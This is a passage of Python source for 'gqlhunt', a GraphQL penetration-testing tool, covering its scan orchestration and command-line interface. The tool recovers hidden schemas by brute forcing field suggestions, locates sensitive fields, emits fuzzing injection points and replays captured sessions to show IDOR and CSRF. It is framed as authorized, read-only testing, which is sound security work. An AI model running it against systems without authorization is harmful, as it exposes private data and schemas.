        m = re.search(r"(query|mutation)\s+(\w+)", q)
        if m:
            return f"{m.group(1)} {m.group(2)}"
        return re.sub(r"\s+", " ", q)[:70]

    @staticmethod
    def meaningful(data):
        """Non-empty payload: not {}, not all-null."""
        if not isinstance(data, (dict, list)):
            return False
        s = json.dumps(data)
        if len(s) < 8:
            return False
        return bool(re.search(r':\s*(?!null)[^,}\]]', s)) or isinstance(data, list)

    def type_is_hot(self, schema, tname):
        for f in schema.fields_of(tname):
            if classify_name(f.get("name") or "",
                             base_type_name(f.get("type"))) == "secret":
                return True
        return False

    def build_query(self, schema: Schema, root_field, max_fields=8):
        """A read-only document selecting scalar leaves, depth-capped."""
        name = root_field.get("name")
        tname = base_type_name(root_field.get("type"))
        if not tname:
            return None
        if schema.is_leaf(tname):
            return "{ %s }" % name
        sel = self.select(schema, tname, depth=2, max_fields=max_fields)
        if not sel:
            return None
        return "{ %s %s }" % (name, sel)

    def select(self, schema: Schema, tname, depth, max_fields, seen=None):
        seen = seen or set()
        if depth <= 0 or tname in seen:
            return ""
        seen = seen | {tname}
        leaves, nested = [], []
        for f in schema.fields_of(tname):
            if schema.required_args(f):
                continue
            sub = base_type_name(f.get("type"))
            if not sub:
                continue
            if schema.is_leaf(sub):
                leaves.append(f.get("name"))
            elif len(nested) < 2:
                nested.append(f)
        pick = leaves[:max_fields]
        parts = list(pick)
        if not parts:
            for f in nested:
                sub = base_type_name(f.get("type"))
                inner = self.select(schema, sub, depth - 1, max_fields, seen)
                if inner:
                    parts.append(f"{f.get('name')} {inner}")
                    break
        if not parts:
            parts = ["__typename"]
        return "{ " + " ".join(parts) + " }"

    # -- injection points for the rest of the toolbox ------------------------

    def emit_injection_points(self, schema: Schema, url):
        if not schema:
            return
        lines = []
        for f in schema.root_queries():
            args = [a for a in (f.get("args") or []) if isinstance(a, dict)]
            if not args:
                continue
            for a in args:
                t = type_ref(a.get("type"))
                if not re.search(r"(?i)string|id|int|float", t):
                    continue
                other = ", ".join(
                    f"{x.get('name')}: {self.dummy(type_ref(x.get('type')))}"
                    for x in args if x is not a
                    and (x.get("type") or {}).get("kind") == "NON_NULL")
                argstr = f"{a.get('name')}: \"FUZZ\"" if "String" in t or \
                    "ID" in t else f"{a.get('name')}: FUZZ"
                if other:
                    argstr = other + ", " + argstr
                doc = "{ %s(%s) %s }" % (
                    f.get("name"), argstr,
                    "" if schema.is_leaf(base_type_name(f.get("type")) or "")
                    else "{ __typename }")
                lines.append(json.dumps({"url": url, "method": "POST",
                                         "body": {"query": doc}}))
        if lines:
            self.write(url, "injection-points.jsonl", "\n".join(lines))
            self.rep.info(f"{len(lines)} injection point(s) written for your "
                          f"other scanners")

    @staticmethod
    def dummy(t):
        if "Int" in t or "Float" in t:
            return "1"
        if "Boolean" in t:
            return "false"
        return '"1"'

    # -- orchestration ------------------------------------------------------

    def hunt(self, target_url, identities):
        budget = Budget(self.args.max_requests, self.args.max_time)
        primary = next((i for i in identities if i.name != "anon"), ANON)
        started = time.time()
        before = len(self.findings)
        self.open_log(target_url, identities)
        self.rep.banner(f"Hunting {target_url}")

        try:
            if self.args.no_discover:
                endpoint = target_url
                probe = GraphQL(self.http, endpoint, self.rep, budget).post(
                    "{__typename}", identity=primary, max_read=64 * 1024)
                if not looks_graphql(probe):
                    if probe.ok and probe.status in (401, 403, 405, 429):
                        self.guarded = [(endpoint, probe.status,
                                         re.sub(r"\s+", " ",
                                                probe.body or "")[:90])]
                        self.report_guarded(target_url)
                    else:
                        self.rep.test(
                            f"{target_url}: not a GraphQL endpoint "
                            f"(HTTP {probe.status}"
                            + (f", {probe.error}" if probe.error else "")
                            + "; --no-discover was given anyway)")
                    return
            else:
                endpoint = self.discover(target_url, primary, budget)
            if not endpoint:
                if not self.report_guarded(target_url):
                    self.rep.test(f"{target_url}: no GraphQL endpoint found")
                return
            gql = GraphQL(self.http, endpoint, self.rep, budget,
                           self.learned_transport)

            # the wire format comes first: everything below depends on it
            transport, working = self.resolve_transport(
                gql, primary, budget, self.learned_transport)
            gql.transport = transport
            self.active_transport = transport
            self.add(Finding(
                sev=INFO,
                title=f"Transport: {transport.label}",
                url=endpoint,
                impact="How this endpoint wants its documents. Learned from "
                       "your captured request when you gave one, probed "
                       "otherwise - a gateway that takes ?doc= is not "
                       "reachable with a plain JSON POST.",
                proof=[transport.describe()
                       + ("" if working else "   (no transport returned data "
                                             "- likely needs a session)")]
                      + ([f"extra URL parameters kept: "
                          f"{', '.join(transport.extra_url)}"]
                         if transport.extra_url else [])))

            seeds = self.doc_identifiers(identities)
            if seeds:
                self.seed_words = seeds
                self.seed_near_misses = self.near_misses_of(seeds)
                self.rep.info(f"{len(seeds)} field name(s) taken from the "
                              f"captured document, used as seeds")

            engine, score, _ = self.fingerprint(gql, primary)
            head = gql.post("{__typename}", identity=primary,
                            max_read=32 * 1024)
            for product, markers in fingerprint_headers(head.headers):
                self.add(Finding(
                    sev=INFO,
                    title=f"Infrastructure: {product}",
                    url=endpoint,
                    impact="Tells you which conventions and which known "
                           "issues of that platform apply.",
                    proof=[f"response headers: {', '.join(markers)}"]))
            self.add(Finding(
                sev=INFO, title=f"GraphQL endpoint: {engine}",
                url=endpoint,
                impact="Engine identification drives the rest: suggestions, "
                       "batching support and framework-specific weaknesses "
                       "all depend on it.",
                proof=[f"engine: {engine}" +
                       (f" (confidence {score})" if score else " (no signature matched)")]))

            # anonymous refusal: say it once, and stop if we have no session
            probe = gql.post("{__typename}", identity=primary)
            why = (gql_errors(probe) or [""])[0] or graph_api_error(probe)
            if gql_data(probe) is None and probe.status in (401, 403):
                has_session = any(i.name != "anon" for i in identities)
                self.add(Finding(
                    sev=INFO,
                    title="GraphQL endpoint requires authentication",
                    url=endpoint,
                    impact="The endpoint answers in GraphQL but refuses "
                           "anonymous operations, so schema recovery and "
                           "every test below need a session.",
                    proof=[f"HTTP {probe.status}: {why}"],
                    note=("a -r identity was supplied and is still refused - "
                          "check that the captured headers are complete "
                          "(Cookie AND Authorization, CSRF header, Origin)"
                          if has_session else
                          "capture an authenticated request in Burp and "
                          "pass it with -r"),
                    poc=f"gqlhunt.py -u {endpoint} -r burp-authenticated.txt"))
                if not has_session:
                    return

            self.check_persisted(gql, primary, endpoint)
            schema, how, _ = self.acquire_schema(gql, primary, budget)
            if schema is None and self.args.no_brute:
                self.rep.info("schema not recovered and --no-brute given")
            if schema is None and not self.args.no_brute:
                if self.suggestions_enabled(gql, primary):
                    self.rep.info("introspection closed, suggestions ON: "
                                  "running the batched brute force")
                    words = self.load_words()
                    known, suggested = self.brute_force_roots(
                        gql, primary, budget, words)
                    roots = sorted(known | suggested)
                    unknown = [r for r in roots
                               if r not in self.field_types]
                    if unknown:
                        self.resolve_field_types(gql, primary, unknown)
                    children = self.brute_force_subfields(
                        gql, primary, budget,
                        [r for r in roots if r in self.field_types][:12],
                        CHILD_WORDS) if roots else {}
                    if roots:
                        lines = []
                        hot = []
                        for r in roots:
                            t = self.field_types.get(r)
                            lines.append(f"Query.{r}" + (f": {t}" if t else ""))
                            if r in children:
                                ctype, fields = children[r]
                                for cf in fields:
                                    lines.append(f"    {ctype}.{cf}")
                                    if classify_name(cf) == "secret":
                                        hot.append(f"{ctype}.{cf} "
                                                   f"(via {r})")
                        self.write(endpoint, "recovered-fields.txt",
                                   "\n".join(lines))
                        proof = [f"Query.{r}" +
                                 (f": {self.field_types[r]}"
                                  if r in self.field_types else "")
                                 for r in roots[:15]]
                        if hot:
                            proof += [f"sensitive: {h}" for h in hot[:10]]
                        self.add(Finding(
                            sev=HIGH if hot else MED,
                            title="Schema recovered without introspection"
                                  + (f" ({len(hot)} sensitive field(s))"
                                     if hot else ""),
                            url=endpoint,
                            impact="Introspection is disabled, which is "
                                   "supposed to hide the schema. Field "
                                   "suggestions gave it up anyway, types "
                                   "included.",
                            proof=proof,
                            note=f"{len(roots)} root field(s), "
                                 f"{sum(len(v[1]) for v in children.values())} "
                                 f"child field(s) - full list in "
                                 f"recovered-fields.txt"))
                else:
                    self.add(Finding(
                        sev=INFO,
                        title="Schema not recovered",
                        url=endpoint,
                        impact="Introspection is refused on every spelling "
                               "tried, __type() probing is blocked too, and "
                               "the engine returns no field suggestions - so "
                               "brute forcing it would burn requests for "
                               "nothing and was skipped.",
                        proof=["introspection: POST, GET, newline-split, "
                               "application/graphql, batch envelope, "
                               "urlencoded - all refused",
                               "__type() probing: refused",
                               "field suggestions: none observed for 45 "
                               "near-miss probes (either disabled, or no "
                               "field of this API is close to them)"],
                        note="the configuration tests below still ran. Next "
                             "lever: --wordlist built from the names in the "
                             "front-end bundle or the mobile app, which also "
                             "feeds the near-miss probe"))

            if schema:
                sdl = schema.sdl()
                if self.args.output_schema:
                    try:
                        with open(self.args.output_schema, "w",
                                  encoding="utf-8") as fh:
                            fh.write(sdl)
                        self.rep.info(f"wrote {self.args.output_schema}")
                    except Exception as e:
                        self.rep.warn(f"cannot write "
                                      f"{self.args.output_schema}: {e}")
                else:
                    self.write(endpoint, "schema.graphql", sdl)
                self.write(endpoint, "schema.json",
                           json.dumps(schema.raw, indent=1)[:4000000])
                self.rep.info(f"schema via: {how}")
                for score, product, markers in fingerprint_schema(schema)[:2]:
                    self.add(Finding(
                        sev=INFO,
                        title=f"Product identified from the schema: {product}",
                        url=endpoint,
                        impact="Knowing the product tells you which fields "
                               "hold what, and which known issues of that "
                               "stack to check by hand.",
                        proof=[f"marker types: {', '.join(markers[:6])}"],
                        note="the HTTP fingerprint said "
                             f"'{engine}'"))
                self.analyse_schema(schema, endpoint)
                self.emit_injection_points(schema, endpoint)

            self.test_battery(gql, primary, endpoint, schema, engine)
            self.harvest_sensitive(gql, endpoint, identities, schema)
            self.authz_differential(gql, endpoint, identities, schema)

        except Budget.Exhausted as e:
            self.rep.warn(f"{target_url}: stopped - {e}")
        except Exception as e:
            self.rep.error(f"{target_url}: {type(e).__name__}: {e}")
            if self.args.verbose >= 2:
                import traceback
                traceback.print_exc()
        finally:
            got = self.findings[before:]
            self.rep.line(f"\n--- {target_url}: {len(got)} finding(s) in "
                          f"{time.time() - started:.1f}s, "
                          f"{budget.requests} request(s)"
                          + (f" - stopped: {budget.reason}"
                             if budget.reason else "") + " ---")
            if not got:
                self.rep.line("no finding: see the log above for what was "
                              "tried and how far each rung got")
            self.rep.detach()
            if self.status:
                self.status.target_done()

    GQL_KEYWORDS = {"query", "mutation", "subscription", "fragment", "on",
                    "true", "false", "null", "nodes", "edges", "node"}

    def doc_identifiers(self, identities):
        """Field names taken from the captured request: free, and real."""
        out = []
        for ident in identities:
            doc = (ident.operation or {}).get("query") or ""
            for w in re.findall(r"[A-Za-z_][A-Za-z0-9_]{2,}", doc):
                if w in self.GQL_KEYWORDS or w.startswith("__"):
                    continue
                if w not in out:
                    out.append(w)
        return out

    @staticmethod
    def near_misses_of(words, limit=40):
        """Drop one character: the cheapest way to make the engine suggest
        the real name back."""
        out = []
        for w in words:
            if len(w) < 5:
                continue
            out.append(w[:len(w) // 2] + w[len(w) // 2 + 1:])
            if len(out) >= limit:
                break
        return out

    def load_words(self):
        words = list(dict.fromkeys(self.seed_words + ROOT_WORDS))
        if self.args.wordlist:
            try:
                with open(self.args.wordlist, encoding="utf-8",
                          errors="replace") as fh:
                    extra = [w.strip() for w in fh if w.strip()
                             and not w.startswith("#")]
                words = list(dict.fromkeys(words + extra))
                self.rep.info(f"wordlist: {len(words)} candidates")
            except Exception as e:
                self.rep.warn(f"cannot read {self.args.wordlist}: {e}")
        return words


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

BANNER = r"""
  gqlhunt - GraphQL recon and vulnerability extractor
  read-only by default; authorized testing only
"""

EPILOG = """
transport (v2)
  A GraphQL endpoint is not one wire format. The document may travel as the
  JSON body's `query`, as a `?doc=` URL parameter, as a form field, as a raw
  application/graphql body - or, on gateways such as Meta's Graph API, in the
  URL AND the body of the same request. -r does not just carry your session,
  it TEACHES that shape; without -r the shape is probed. Every request the
  tool makes, and every PoC it prints, uses it.

  Two tests come out of that, and nothing else does them: how many channels
  accept a document (a filter written for one is bypassed through another),
  and, when a request carries two of them, WHICH copy the engine executes -
  because the other one is what your WAF and your audit log are reading.

what it does that a scanner does not
  schema      introspection, then GET, then filter-evasion spellings, then
              batched __type() probing, then - only if suggestions are proven
              enabled - a brute force that tests 64 candidates PER REQUEST.
              Every rung is bounded by --max-requests and --max-time, so the
              run always ends.
  analysis    mutations ranked by destructiveness, sensitive fields located,
              and the nested paths that reach a protected type by another
              route (where the authorization check is usually missing).
  proof       every test reports a measurement or a returned value. CSRF is
              proven with `mutation{__typename}` - a real mutation operation
              that executes no resolver.
  authz       -r replays your authenticated operation anonymously; -r2 replays
              it as a second account. Identical data across identities is the
              IDOR, and it is proven on both sides.

output (-o, default ./gqloutput/<host>/)
  output.log, pocs.txt (each finding as a pasteable body, curl and raw HTTP
  request), schema.graphql, schema.json, mutations.txt,
  sensitive-fields.txt, nested-paths.txt, recovered-fields.txt,
  injection-points.jsonl

safety
  Mutations are never executed (--allow-mutations opts in, and still refuses
  destructive verbs). Alias and depth probes are bounded and measured, not
  amplified: the missing guard rail is the finding, the outage is not.

examples
  gqlhunt.py -u https://target.example.com
  gqlhunt.py -u https://target/graphql -r burp-authenticated.txt
  gqlhunt.py -u https://target/graphql -r acct-a.txt -r2 acct-b.txt -v 1
  gqlhunt.py -l hosts.txt -t 8 -d 0.2 -o ./loot-graphql
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="gqlhunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", dest="verbose", type=int, nargs="?", const=1,
                   default=0, choices=[0, 1, 2],
                   help="verbosity: 0 = only findings (default), 1 = every "
                        "test performed, 2 = debug (full request and the "
                        "exact document sent, response status/size/timing)")
    p.add_argument("-u", dest="url", help="single URL to test (an origin, or "
                                          "the GraphQL endpoint itself)")
    p.add_argument("-l", dest="list", help="file containing a list of URLs")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("-H", "--header", action="append", default=[],
                   metavar="HEADER",
                   help="extra header 'Name: value' (repeatable) - also how "
                        "to set a Cookie or override the User-Agent")
    p.add_argument("-p", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("-r", "--request", metavar="FILE",
                   help="raw HTTP request file (Burp/ZAP export): the URL, "
                        "the headers (Cookie, Authorization...) and the "
                        "GraphQL operation in the body are taken from it and "
                        "replayed - this is the authenticated identity")
    p.add_argument("-r2", "--second-request", metavar="FILE", dest="request2",
                   help="a SECOND raw HTTP request file, from a different "
                        "account: the first account's operation is replayed "
                        "under this identity to prove cross-account reads "
                        "(IDOR), and CSRF is checked against both")
    p.add_argument("--force-ssl", action="store_true",
                   help="force https for a -r / -r2 request (default: "
                        "inferred from Origin/Referer, else http)")
    p.add_argument("-o", "--output-dir", default="gqloutput", metavar="DIR",
                   help="directory for the results (default ./gqloutput), "
                        "one subdirectory per host; empty string disables")
    p.add_argument("--output-schema", metavar="FILE",
                   help="write the reconstructed SDL to this exact file "
                        "instead of <output-dir>/<host>/schema.graphql")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets in -l mode (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0, metavar="SEC",
                   help="minimum gap between requests, enforced globally")
    p.add_argument("--timeout", type=float, default=15.0,
                   help="request timeout (s, default 15)")
    p.add_argument("--status-interval", type=float, default=30.0,
                   metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("--max-requests", type=int, default=1200, metavar="N",
                   help="hard request budget per target (default 1200)")
    p.add_argument("--max-time", type=float, default=300.0, metavar="SEC",
                   help="hard time budget per target (default 300)")
    p.add_argument("--batch-size", type=int, default=64, metavar="N",
                   help="candidates aliased into one request during brute "
                        "force (default 64)")
    p.add_argument("--wordlist", metavar="FILE",
                   help="extra root-field candidates for the brute force, "
                        "one per line (the built-in list is used as well)")
    p.add_argument("--no-brute", action="store_true",
                   help="never run the suggestion brute force, even when "
                        "introspection is closed and suggestions are on")
    p.add_argument("--paths", metavar="FILE",
                   help="extra endpoint paths to probe during discovery, one "
                        "per line (merged with the built-in list). Site "
                        "specific paths found by hand go here rather than in "
                        "the script")
    p.add_argument("--no-discover", action="store_true",
                   help="treat -u / -l entries as the endpoint itself and "
                        "skip the path search")
    p.add_argument("--alias-count", type=int, default=100, metavar="N",
                   help="aliases used to measure batching (default 100)")
    p.add_argument("--max-depth", type=int, default=12, metavar="N",
                   help="deepest nesting used to look for a missing depth "
                        "limit (default 12)")
    p.add_argument("--max-probe-fields", type=int, default=25, metavar="N",
                   help="root queries replayed in the authorization diff "
                        "(default 25)")
    p.add_argument("--allow-mutations", action="store_true",
                   help="allow replaying a captured MUTATION during the "
                        "authorization diff (destructive verbs are still "
                        "refused). Off by default.")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    return p


def load_urls(path):
    out = []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except Exception as e:
        print(f"cannot read {path}: {e}", file=sys.stderr)
        sys.exit(2)
    return out


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.no_color or not sys.stdout.isatty():
        Colors.disable()
    rep = Reporter(args.verbose)

    identities = [ANON]
    target_from_request = None
    learned_transport = None
    for flag, path, name in (("-r", args.request, "acct1"),
                             ("-r2", args.request2, "acct2")):
        if not path:
            continue
        try:
            url, ident, transport = identity_from_request(path, name,
                                                          args.force_ssl)
        except Exception as e:
            print(f"{flag}: {e}", file=sys.stderr)
            sys.exit(2)
        identities.append(ident)
        target_from_request = target_from_request or url
        if learned_transport is None:
            learned_transport = transport

    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        targets += load_urls(args.list)
    if not targets and target_from_request:
        targets.append(target_from_request)
    if not targets:
        print("nothing to do: give -u, -l or -r", file=sys.stderr)
        sys.exit(2)
    if args.request2 and not args.request:
        print("-r2 needs -r (it is the second identity, not the first)",
              file=sys.stderr)
        sys.exit(2)

    http = Http(timeout=args.timeout, proxy=args.proxy, headers=args.header,
                delay=args.delay, rep=rep)
    status = Status(rep, len(targets), args.status_interval,
                    enabled=bool(args.list))
    args._transport = learned_transport
    hunter = GqlHunter(http, rep, args, args.output_dir, status)

    print(f"{Colors.CYAN}{BANNER}{Colors.RESET}")
    ids = ", ".join(i.name for i in identities)
    print(f"  targets {Colors.BOLD}{len(targets)}{Colors.RESET}   "
          f"identities {ids}   budget {args.max_requests} req / "
          f"{args.max_time:.0f}s per target"
          + (f"   output -> {args.output_dir}" if args.output_dir
             else "   output disabled"))
    print()

    t0 = time.time()
    status.start_thread()
    if len(targets) == 1 or args.threads <= 1:
        for t in targets:
            hunter.hunt(t, identities)
    else:
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=args.threads) as ex:
            list(ex.map(lambda t: hunter.hunt(t, identities), targets))
    status.stop()

    C = Colors
    print(f"\n{C.BOLD}--- summary ---{C.RESET}")
    print(f"targets   : {len(targets)}")
    print(f"requests  : {http.count}")
    print(f"duration  : {time.time() - t0:.1f}s")
    counts = {}
    for f in hunter.findings:
        counts[f.sev] = counts.get(f.sev, 0) + 1
    if not counts:
        print("findings  : none")
    for sev in (CRIT, HIGH, MED, LOW, INFO):
        if counts.get(sev):
            print(f"  {sev_paint(sev)}{sev:<10}{C.RESET} {counts[sev]}")
    if args.output_dir and hunter.findings:
        print(f"\noutput written under {args.output_dir}/")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        sys.exit(130)
